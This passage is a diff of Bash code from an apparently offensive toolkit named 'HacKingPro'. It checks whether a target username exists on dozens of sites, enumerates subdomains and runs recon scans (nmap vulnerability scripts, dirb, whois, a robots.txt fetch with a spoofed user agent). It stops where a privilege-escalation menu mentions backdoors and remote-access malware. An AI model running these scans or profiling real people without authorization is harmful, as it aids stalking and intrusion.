+    check1=$(curl -s -i "https://news.ycombinator.com/user?id=$targetNAME" -H "Accept-Language: en" -L | grep -o 'No such user' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://news.ycombinator.com/user?id=%s\n" $targetNAME
+      printf "https://news.ycombinator.com/user?id=%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## CodeMentor
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] CodeMentor: ${resetT}"
+    check1=$(curl -s -i "https://www.codementor.io/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.codementor.io/%s\n" $targetNAME
+      printf "https://www.codementor.io/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## ReverbNation
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] ReverbNation: ${resetT}"
+    check1=$(curl -s -i "https://www.reverbnation.com/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.reverbnation.com/%s\n" $targetNAME
+      printf "https://www.reverbnation.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Designspiration 65
+    # printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Designspiration: ${resetT}"
+    # check1=$(curl -s -i "https://www.designspiration.net/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?)
+    # if [[ $check1 == *'0'* ]] ; then
+      # printf "${BYellow}Not Found!${resetT}\n"
+    # elif [[ $check1 == *'1'* ]]; then
+      # printf "${BGreen} Found!${resetT} https://www.designspiration.net/%s\n" $targetNAME
+      # printf "https://www.designspiration.net/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    # fi
+
+    ## Bandcamp
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Bandcamp: ${resetT}"
+    check1=$(curl -s -i "https://www.bandcamp.com/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.bandcamp.com/%s\n" $targetNAME
+      printf "https://www.bandcamp.com/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+
+    ## ColourLovers
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] ColourLovers: ${resetT}"
+    check1=$(curl -s -i "https://www.colourlovers.com/love/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.colourlovers.com/love/%s\n" $targetNAME
+      printf "https://www.colourlovers.com/love/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+
+    ## IFTTT
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] IFTTT: ${resetT}"
+    check1=$(curl -s -i "https://www.ifttt.com/p/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.ifttt.com/p/%s\n" $targetNAME
+      printf "https://www.ifttt.com/p/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Ebay
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Ebay: ${resetT}"
+    check1=$(curl -s -i "https://www.ebay.com/usr/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found\|eBay Profile - error' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.ebay.com/usr/%s\n" $targetNAME
+      printf "https://www.ebay.com/usr/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Slack
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Slack: ${resetT}"
+    check1=$(curl -s -i "https://$targetNAME.slack.com" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://%s.slack.com\n" $targetNAME
+      printf "https://%s.slack.com\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## OkCupid
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] OkCupid: ${resetT}"
+    check1=$(curl -s -i "https://www.okcupid.com/profile/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.okcupid.com/profile/%s\n" $targetNAME
+      printf "https://www.okcupid.com/profile/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Trip
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Trip: ${resetT}"
+    check1=$(curl -s -i "https://www.trip.skyscanner.com/user/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found\|HTTP/2 410' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.trip.skyscanner.com/user/%s\n" $targetNAME
+      printf "https://www.trip.skyscanner.com/user/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Ello
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Ello: ${resetT}"
+    check1=$(curl -s -i "https://ello.co/$targetNAME" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://ello.co/%s\n" $targetNAME
+      printf "https://ello.co/%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Tracky
+    # printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Tracky: ${resetT}"
+    # check1=$(curl -s -i "https://tracky.com/user/$targetNAME" -H "Accept-Language: en" -L | grep -o 'profile:username' ; echo $?)
+    # if [[ $check1 == *'1'* ]] ; then
+      # printf "${BYellow}Not Found!${resetT}\n"
+    # elif [[ $check1 == *'0'* ]]; then
+      # printf "${BGreen} Found!${resetT} https://tracky.com/~%s\n" $targetNAME
+      # printf "https://tracky.com/~%s\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    # fi
+
+    ## Tripit
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Tripit: ${resetT}"
+    check1=$(curl -s -i "https://www.tripit.com/people/$targetNAME#/profile/basic-info" -H "Accept-Language: en" -L | grep -o 'location: https://www.tripit.com/home' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+      printf "${BGreen} Found!${resetT} https://www.tripit.com/people/%s#/profile/basic-info\n" $targetNAME
+      printf "https://www.tripit.com/people/%s#/profile/basic-info\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+    fi
+
+    ## Basecamp
+    printf "    ${BWhite}[${resetT}${BGreen}+${resetT}${BWhite}] Basecamp: ${resetT}"
+    check1=$(curl -s -i "https://$targetNAME.basecamphq.com/login" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?)
+    if [[ $check1 == *'0'* ]] ; then
+      printf "${BYellow}Not Found!${resetT}\n"
+    elif [[ $check1 == *'1'* ]]; then
+
+      printf "${BGreen} Found!${resetT} https://%s.basecamphq.com/login\n" $targetNAME
+      printf "https://%s.basecamphq.com/login\n" $targetNAME >> ${targetNAME}-UserFinder.txt
+
+    fi
+
+    partial
+
+    less ${targetNAME}-UserFinder.txt
+  }
+
+  scanner
+  }
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CDI ]--╼▰ [ Sub Domain Finder ]
+SubMaxPro(){
+  # src: https://github.com/gokulapap/submax
+
+  clear
+  cd "${MainDirectoriyCaseNameRecon}"
+
+  # printf "\n${BYellow}[*] Installing Requirements..please wait !\n"
+  # apt install toilet &> /dev/null
+
+  # toilet -f slant -F gay submax
+
+  # printf "\n\n${BWhite}[!] Enter domain to Enumerate subdomains : "
+  # read -r targetDns
+  clear
+  printf "\n"
+  echo "    ${BYellow}${faintT}┌──${resetT}${BRed}[${BYellow} SubMaxPro ${BRed}]"
+  echo "    ${BYellow}${faintT}|"
+  echo "    ${BYellow}${faintT}┖──┲─╼ ${resetT}${BRed}[${BYellow} * ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BYellow} Subdomain Enumeration Started! ${BRed}]"
+  echo "    ${BYellow}${faintT}   | "
+  echo "    ${BYellow}${faintT}   |──────────╼ ${resetT}${BRed}[${BYellow} + ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BYellow} Enumerating SubDomains from SubFinder ${BRed}]"
+  echo "    ${BYellow}${faintT}   | "
+  subfinder -d ${targetDns} > sub1
+  echo "    ${BYellow}${faintT}   | "
+  echo "    ${BYellow}${faintT}   |──────────╼ ${resetT}${BRed}[${BYellow} + ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BYellow} Enumerating SubDomains from AssetFinder ${BRed}]"
+  echo "    ${BYellow}${faintT}   | "
+  assetfinder ${targetDns} > sub2
+  echo "    ${BYellow}${faintT}   | "
+  echo "    ${BYellow}${faintT}   |──────────╼ ${resetT}${BRed}[${BYellow} + ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BYellow} Enumerating SubDomains from crt.sh ${BRed}]"
+  echo "    ${BYellow}${faintT}   | "
+  curl -s "https://crt.sh/?q=${targetDns}" | grep "<TD>" | grep ${targetDns} | cut -d ">" -f2 | cut -d "<" -f1 | sort -u | sed '/^*/d' > sub3
+  echo "    ${BYellow}${faintT}   | "
+  echo "    ${BYellow}${faintT}   |──────────╼ ${resetT}${BRed}[${BYellow} + ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BYellow} Enumerating SubDomains from rapiddns ${BRed}]"
+  echo "    ${BYellow}${faintT}   | "
+  curl -s "https://rapiddns.io/subdomain/${targetDns}#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sort -u > sub4
+  echo "    ${BYellow}${faintT}   | "
+  echo "    ${BYellow}${faintT}   |──────────╼ ${resetT}${BRed}[${BYellow} + ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BYellow} Enumerating SubDomains from bufferover ${BRed}]"
+  echo "    ${BYellow}${faintT}   | "
+  curl -s "https://dns.bufferover.run/dns?q=.${targetDns}" | jq -r .FDNS_A[] | cut -d '\' -f2 | cut -d "," -f2 |  sort -u > sub5
+  # echo "    ${BYellow}${faintT}   | "
+  # echo "    ${BYellow}${faintT}   |──────────╼ ${resetT}${BRed}[${BYellow} + ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BYellow} Enumerating SubDomains from riddler ${BRed}]"
+  # echo "    ${BYellow}${faintT}   | "
+  # curl -s "https://riddler.io/search/exportcsv?q=pld:${targetDns}" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u > sub6
+  # echo "    ${BYellow}${faintT}   | "
+  # echo "    ${BYellow}${faintT}   |──────────╼ ${BRed}[${BYellow} + ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BYellow}  Enumerating SubDomains from jldc ${BRed}]"
+  # echo "    ${BYellow}${faintT}   | "
+  # curl -s "https://jldc.me/anubis/subdomains/${targetDns}" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | cut -d "/" -f3 > sub7
+  echo "    ${BYellow}${faintT}   | "
+  echo "    ${BYellow}${faintT}   |──────────╼ ${resetT}${BRed}[${BYellow} + ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BYellow} Enumerating SubDomains from omnisint ${BRed}]"
+  echo "    ${BYellow}${faintT}   | "
+  curl -s "https://sonar.omnisint.io/subdomains/${targetDns}" | cut -d "[" -f1 | cut -d "]" -f1 | cut -d "\"" -f 2 > sub8
+  echo "    ${BYellow}${faintT}   | "
+  echo "    ${BYellow}${faintT}   ┖──────────╼ ${resetT}${BRed}[${BYellow} * ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BGreen} Subdomain Enumeration Completed ! ${BRed}]"
+
+  Press_ENTER
+
+
+  # printf "${BGreen}\n[+] Enumerating subdomains from ridder .."
+
+  sort sub1 >> ${targetDns}-SubMa
+  sort sub2 >> ${targetDns}-SubMa
+  sort sub3 >> ${targetDns}-SubMa
+  sort sub4 >> ${targetDns}-SubMa
+  sort sub5 >> ${targetDns}-SubMa
+  # sort sub6 >> ${targetDns}-SubMa
+  # sort sub7 >> ${targetDns}-SubMa
+  sort sub8 >> ${targetDns}-SubMa
+  sort -u ${targetDns}-SubMa >> ${targetDns}-SubMax.logtmp
+  rm sub* ${targetDns}-SubMa
+
+  # for i in $xxxx ; do
+  #   #statements
+  #   echo "${ORANGE}|    ${i}    |"
+  # done
+
+  num=$( wc -l ${targetDns}-SubMax.logtmp | awk '{print $1; exit}')
+
+  echo "\n"  >> ${targetDns}-SubMax.log
+  ToolHeaderRun >> ${targetDns}-SubMax.log
+  TargetStatusRun >> ${targetDns}-SubMax.log
+  echo "\n"  >> ${targetDns}-SubMax.log
+  echo "    ${BYellow}${faintT}┌──╼ ${resetT}${BRed}[${BYellow} ${HacKingPro} ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BCyan} SubMaxPro ${resetT}${BRed}]" >> ${targetDns}-SubMax.log
+  for i in $(cat ${targetDns}-SubMax.logtmp); do
+    #statements
+    echo "    ${BYellow}${faintT}| " >> ${targetDns}-SubMax.log
+    echo "    ${BYellow}${faintT}|───╼ ${resetT}${BRed}[${BYellow} + ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BWhite} $i ${resetT}${BRed}]" >> ${targetDns}-SubMax.log
+    echo "    ${BYellow}${faintT}| " >> ${targetDns}-SubMax.log
+  done
+  echo "    ${BYellow}${faintT}| " >> ${targetDns}-SubMax.log
+  echo "    ${BYellow}${faintT}|───╼ ${resetT}${BRed}[${BYellow} * ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BYellow} Found! ${ORANGE}$num ${BWhite}SubDomains for ${targetDns}${BRed}]" >> ${targetDns}-SubMax.log
+  echo "    ${BYellow}${faintT}┖───╼ ${resetT}${BRed}[${BWhite} ! ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${BWhite} view the ${ORANGE}${MainDirectoriyCaseNameRecon}/${targetDns}-SubMax.log ${BWhite}File for Results!${BRed}]" >> ${targetDns}-SubMax.log
+  echo "\n\n"  >> ${targetDns}-SubMax.log
+  rm ${targetDns}-SubMax.logtmp
+  less -R ${targetDns}-SubMax.log
+
+  read -p ${Press_ENTER}
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ TraceRoute Scan Log ]
+infoTraceRoute(){
+  echo "\n\t\t${BGreen}### TraceRoute Scan Log | Time: $(date)"
+  echo "# Scan | TraceRoute | Time: $(date) $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(traceroute $targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  Press_ENTER
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ Ping Scan Log ]
+infoPing(){
+  echo "\n\t\t${BGreen}### Ping Scan Log | Time: $(date)"
+  echo "# Scan | Ping | Time: $(date) $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(ping $targetIP -c4) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  Press_ENTER
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ Nslookup Scan Log ]
+infoNsLookUp(){
+  echo "\n\t\t${BGreen}### Nslookup Scan Log | Time: $(date)"
+  echo "# Scan | Nslookup | Time: $(date) $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(nslookup $targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  Press_ENTER
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ Dig Scan Log ]
+infoDig(){
+  echo "\n\t\t${BGreen}### Dig Scan Log | Time: $(date)"
+  echo "# Scan | Dig | Time: $(date) $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(dig $targetIP all) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  Press_ENTER
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ ARP Scan Log ]
+infoArp(){
+  echo "\n\t\t${BGreen}### Arp Scan Log | Time: $(date)"
+  echo "# Scan | Arp | Time: $(date) $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(arp -a) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  Press_ENTER
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ WhoIS Scan Log ]
+infoWhois(){
+  echo "\n\t\t${BGreen}### WhoIs Scan Log | Time: $(date)"
+  echo "# Scan | WhoIs | Time: $(date) $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(whois $targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  Press_ENTER
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ Nmap Scan Log ]
+infoNmap(){
+  echo "\n\t\t${BGreen}### Nmap Scan Log | Time: $(date)"
+  echo "# Scan | Nmap | Time: $(date) $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(sudo nmap -Pn -sV -sC -O $targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+
+  echo "\n\t\t${BGreen}### Nmap Vulnerability Scan Log | Time: $(date)"
+  echo "# Scan | Nmap Vulnerability | Time: $(date) $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(sudo nmap -sV -script vuln $targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  Press_ENTER
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ Dirb Scan Log ]
+infoDirb(){
+  echo "\n\t\t${BGreen}### Dirb Scan Log | Time: $(date)"
+  echo "# Scan | Dirb | Time: $(date) $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(dirb http://$targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  Press_ENTER
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ ipinfo.io Scan Log ]
+infoIp(){
+  echo "\n\t\t${BGreen}### IP Info Scan Log | Time: $(date)"
+  echo "# Scan | IP Info | Time: $(date) $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(curl ipinfo.io/${targetIP})" >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  Press_ENTER
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ Robots.txt Scan Log ]
+infoRobots(){
+  echo "\n\t\t${BGreen}### Robots.txt Scan Log | Time: $(date)"
+  echo "# Scan | Robots.txt | Time: $(date) $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " $(wget --user-agent="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" -O - ${targetDns}/robots.txt --quiet | sort -u)" >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "\`\`\` " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  Press_ENTER
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ Run All, TraceRoute, Ping, Nslookup, Dig, WhoIs, Dirb, Nmap, Arp ]
+AllInfo(){
+  infoPing
+  infoArp
+  infoTraceRoute
+  infoNsLookUp
+  infoRobots
+  infoWhois
+  infoDig
+  infoDirb
+  infoNmap
+  infoIp
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ Vulnerability Assessment ]
+startRecon(){
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "# Reconnaissance & Vulnerability Assessment | Date: $(date) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "> - ### Target Name: ${targetNAME}" >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "> - ### Target IP: ${targetIP}" >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "> - ### Target Dns: ${targetDns}" >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "> - ### Target Email: ${targetEmail}" >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "> - ### Target Phone: ${targetPhone}" >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  #
+  echo "---" >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+  echo "---" >> ${targetNAME}-HacKingPro-Recon-Log.md
+}
+#--╼▰[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰ [ CLI ]--╼▰ [ Dirb Scan Log ]
+Recon_Start(){
+  MainDirectoriyCaseNameRecon="${MainDirectoriyCaseName}/Recon"
+  mkdir ${MainDirectoriyCaseNameRecon}
+  cd ${MainDirectoriyCaseNameRecon}
+  if [ -z $targetIP ]; then
+    #statements
+    Checking_IP_Target
+  else
+    ReconStart(){
+      #
+      if [ -d $MainDirectoriyCaseNameRecon ]; then
+        #statements
+        echo "\n\t\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}$targetNAME ${BBlue}Case $targetNAME Folder Exists, Continue to it\n"
+      else
+        echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Case Folder and Continue to it\n"
+        mkdir "${MainDirectoriyCase}"
+        cd "${MainDirectoriyCase}"
+
+        echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating ${targetNAME} Folder and Continue to it\n"
+        mkdir "${MainDirectoriyCaseName}"
+        cd "${MainDirectoriyCaseName}"
+
+        echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Recon and Continue to it\n"
+        mkdir "${MainDirectoriyCaseNameRecon}"
+        cd "${MainDirectoriyCaseNameRecon}"
+      fi
+      startRecon
+      Press_ENTER
+    }
+    ReconStart
+  fi
+}
+
+#################################################################
+#------╼╼▰[ Main Menu ]--╼▰[ Privileg Escalation ]--╼▰ [ Head ] #
+#################################################################
+#--╼[ Main Menu ]--╼▰ [ 01 ]--╼▰ [  Reconnaissance & Information Gathering  ]--╼▰[ Privileg Escalation ]
+PrivilegEscalationPro(){
+  while true; do
+    cd "$x_Menu_2"
+    clear
+    ToolHeaderRun
+    TargetStatusRun
+    HacKingProMenuMain=$(echo "
+    ${DGrey}${faintT}┌──╼ ${resetT}${BRed}[${BWhite} Privileg Escalation ${resetT}${BRed}]
+    ${DGrey}${faintT}┖─┲──╼ ${resetT}${BRed}[${BWhite}${faintT} Cheat Sheet for Privilege Escalation Enumerations ${BRed}]
+    ${DGrey}${faintT}  ┖──╼ ${resetT}${BRed}[${BWhite}${faintT} Intruder creates Remote Access Malware Weapon, such as a Virus or Worm, tailored to one or more Vulnerabilities. ${BRed}]
+
+    ${DGrey}${faintT}┌─╼ ${resetT}${BRed}[${DGrey} Why would someone perform privilege escalation? ${BRed}]
+    ${DGrey}${faintT}┖─┲──╼ ${resetT}${BRed}[${DGrey}${faintT} Read/Write sensitive files ${resetT}${BRed}]
+    ${DGrey}${faintT}  |──╼ ${resetT}${BRed}[${DGrey}${faintT} Persist easily between reboots ${resetT}${BRed}]
+    ${DGrey}${faintT}  └──╼ ${resetT}${BRed}[${DGrey}${faintT} Insert a permanent bacdoor ${resetT}${BRed}]
+
